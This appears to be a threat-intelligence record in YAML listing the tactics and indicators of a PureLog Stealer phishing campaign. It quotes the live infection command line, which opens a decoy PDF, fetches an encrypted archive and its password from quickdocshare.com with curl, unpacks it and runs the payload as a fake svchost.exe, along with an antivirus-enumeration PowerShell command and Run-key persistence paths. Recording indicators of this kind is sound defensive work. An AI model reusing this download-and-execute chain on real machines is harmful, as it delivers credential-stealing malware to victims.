description: PureLog stealer campaign uses targeted phishing emails with language-matched
  lures to deliver encrypted payloads via a Python-based loader and dual .NET loaders.
malware_families:
- PureLog Stealer
TTPs:
  processes:
  - cmd.exe
  - svchost.exe
  - python.exe
  - curl.exe
  - chrome.exe
  - msedge.exe
  - explorer.exe
  - conhost.exe
  - cvires.exe
  commandline:
  - cmd.exe /c start "" ".\_document.pdf" && curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ"
    -o ".\_invoice.pdf" && for /f "delims=" %i in ('curl -A "curl/meow_meow" -s -k
    -L "https://quickdocshare.com/DQ/key"') do .\_FILE_2025__.png x -p"%i" ".\_invoice.pdf"
    "C:\Users\Public\" -y >nul && del ".\_invoice.pdf" && cd "C:\Users\Public\Windows"
    && svchost.exe "instructions.pdf"
  - curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ" -o ".\_invoice.pdf"
  - curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ/key"
  - .\_FILE_2025__.png x -p"%i" ".\_invoice.pdf" "C:\Users\Public\" -y
  - svchost.exe "instructions.pdf"
  - powershell -NoProfile -WindowStyle Hidden -Command "Get-WmiObject -Namespace root/SecurityCenter2
    -Class AntivirusProduct | ForEach-Object { $_.displayName }"
  - C:\Program Files\Google\Chrome\Application\chrome.exe --type=renderer --user-data-dir="C:\Users\[REDACTED]\AppData\Local\Temp\qs4hg1fa.prl"
    --extension-process --no-pre-read-main-dll --no-sandbox --disable-gpu-compositing
    --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1.25
    --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=9
    --time-ticks-at-unix-epoch=-1770049222788996 --launch-time-ticks=353424829690
    --metrics-shmem-handle=4156,i,299084443807041640,15390022656206001629,2097152
    --field-trial-handle=2068,i,9344726561852850498,17132715209763330275,262144 --variations-seed-version
    --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=3988
    /prefetch:9G
  - svchost.exe -c "exec(base64...)"
  - cmd.exe /c start *" "{script_path}"*
  - chrome.exe --disable-fre no-default-browser-check ...
  powershell:
  - Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct | ForEach-Object
    { $_.displayName }
  - Get-WmiObject -Namespace root/SecurityCenter2 Class AntivirusProduct | ForEach-Object
    { $_displayName }
  scripting_engine:
  - 
  - import ctypeskernel3a = ctypes.WinDLL("kernel32")
  - import winreg, os, sys
  - import ctypes, struct, zlib, user32 = ctypes.windll.user32gdi32 = ctypes.windll.gdi32
  - import os, subprocess
  - import json, base64, urllib.request
  registry_keys:
  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  - HKEY_CURRENT_USER\Software\Microsoft\Windows\StateRepository\AppModel\CacheVersion
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  image_load:
  - C:\Users\Public\Windows\python314.dll
  - C:\Users\Public\Windows\DLLs\_ctypes.pyd
  - C:\Users\Public\Windows\DLLs\libffi-8.dll
  - C:\Users\Public\Windows\DLLs\_hashlib.pyd
  - C:\Users\Public\Windows\DLLs\libcrypto-3.dll
  - C:\Users\Public\Windows\DLLs\_socket.pyd
  - C:\Users\Public\Windows\DLLs\_ssl.pyd
